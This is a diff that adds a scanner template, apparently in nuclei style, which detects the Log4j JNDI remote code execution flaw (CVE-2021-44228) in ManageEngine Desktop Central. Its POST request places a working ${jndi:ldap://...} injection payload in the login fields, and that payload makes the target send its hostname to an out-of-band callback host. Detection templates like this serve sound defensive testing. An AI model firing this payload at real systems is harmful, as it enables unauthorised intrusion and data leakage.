@@ -1,0 +1,33 @@
+id: manage-engine-dc-log4j-rce
+brief:
+    title: Manage Engine Desktop Central - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: Manage Engine Endpoint Central (formerly Desktop Central) is susceptible to Log4j JNDI remote code execution. Endpoint Central is a Unified Endpoint Management (UEM) & Endpoint protection suite tha...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - manage
+        - engine
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/two_fact_auth'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}/configurations'
+      body: j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&j_password=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&otpTimeout=7&browserLocale=en_us&cacheNum=4&csrfPreventionSaltForFlashMessage=
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
